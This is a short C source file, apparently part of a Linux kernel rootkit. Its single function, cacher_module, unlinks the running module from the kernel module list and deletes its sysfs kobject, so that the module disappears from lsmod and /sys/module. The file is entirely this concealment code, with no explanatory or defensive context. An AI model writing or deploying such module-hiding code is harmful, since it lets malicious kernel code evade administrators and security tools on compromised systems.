#include <linux/module.h>
#include <linux/list.h>
#include <linux/kobject.h>
#include "dissimulation.h"

void cacher_module(void)
{
    list_del(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
}
